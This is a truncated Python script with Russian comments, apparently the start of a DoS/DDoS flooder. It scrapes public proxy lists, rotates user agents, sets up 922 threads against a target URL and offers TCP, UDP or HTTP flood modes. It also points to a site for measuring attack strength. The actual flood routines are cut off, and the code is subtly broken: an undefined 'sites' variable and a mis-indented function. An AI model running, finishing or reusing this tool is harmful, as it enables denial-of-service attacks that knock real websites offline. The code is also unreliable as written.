
# -*- coding: utf-8 -*-
import urllib.request
import sys
from scapy.all import * 

import socket
import socks
import argparse
import threading
import random



author = "Жмышенко Валерий Альбертович 54 года"


ites = ["https://www.socks-proxy.net/","http://free-proxy-list.net/"] #Сайты откуда берем прокси
useragents = []
##Мощность DoS-а зависит от вашего интернет соеденения!!!
multiple = 100 # Умножение, значение можно менять
threads = 922 # Кол-во потоков, можно менять
choice1 = 0 
choice2 = 0 #Для настройки типа флуда
choice3 = 0 #Для настройки типа флуда
port = 80 # Порт куда будут слаться заросы, можно менять


parser = argparse.ArgumentParser()
parser.add_argument('-useragent', help = 'Путь до файла с user-агентами')
parser.add_argument('-proxylist', help = 'Путь до файла с proxy')
parser.add_argument('-url', help = 'Цель')
parser.add_argument('-getproxy', help = 'Получить прокси? 1 - да | 0 - нет')
args = parser.parse_args()
useragents_file = args.useragent
needproxy = args.getproxy
url = args.url
proxies_list = args.proxylist
if proxies_list == "": # Если прокси не указана закрыть программу
    print("Укажи прокси!")
    exit()
if useragents_file == "": # Если useragent-ы не указаны закрыть программу
    print("Укажи useragent-ов!")
    exit()
proxies = open(proxies_list).readlines() # Читаем прокси


###### Получение юзер агента с файла
handle = open(useragents_file)
for x in handle:
    useragents.append(x)
useragents = map(lambda s: s.strip(), useragents)
useragents = list(useragents)
######

def checkURL(): #Редактируем URL
    global url
    global url2
    global urlport


    try:
        if url[0]+url[1]+url[2]+url[3] == "www.":
            url = "http://" + url
        elif url[0]+url[1]+url[2]+url[3] == "http":
            pass
        else:
            url = "http://" + url
    except:
        print("Ошибка!")
        exit()

    try:
        url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
    except:
        url2 = url.replace("http://", "").replace("https://", "").split("/")[0]

    try:
        urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
    except:
        urlport = "80"




def getPROXY(urlproxy):
    try:
        req = urllib.request.Request(("{0}").format(str(urlproxy)))
        req.add_header("User-Agent", random.choice(useragents))
        sourcecode = urllib.request.urlopen(req)
        part = str(sourcecode.read())
        part = part.split("<tbody>")
        part = part[1].split("</tbody>")
        part = part[0].split("<tr><td>")
        proxies = ""
        for proxy in part:
            proxy = proxy.split("</td><td>") #Получаем прокси с сайта путем разделения тегов
            try:
                proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
            except:
                pass
        handle = open("proxy.txt","a") #Записуем полученные прокси в файл
        handle.write("")
        handle.write(proxies)
        handle.close()
        print ("Прокси скачаны успешно!")
    except:
        print ("Ошибка!")



if needproxy == "1": # Нужно ли качать прокси?
    #### Получение проксей
    for x in sites:
        getPROXY(x)
    ####


    def typeflood(): # Определяем тип флуда
    global choice1 #Для сайтов самый сильный - HTTP
    global choice2
    global choice3

    select = input("UDP или TCP или HTTP? => ")
    if select == "TCP":
        choice1 = "1" # Изначально программа была в интерактивном режиме
        choice2 = "y" # Но я убрал его, оставив лишь выбор метода флуда
        choice3 = "0" # Поэтому переменные называются choice))
    if select == "UDP":
        choice1 = "2"
        choice2 = "y" #Тестить мощь ваше DoS-а или DDoS-а можно здесь: https://www.vedbex.com/tools/dstat
        choice3 = "0"
    if select == "HTTP":
        choice1 = "0"
        choice2 = "y"
        choice3 = "0"
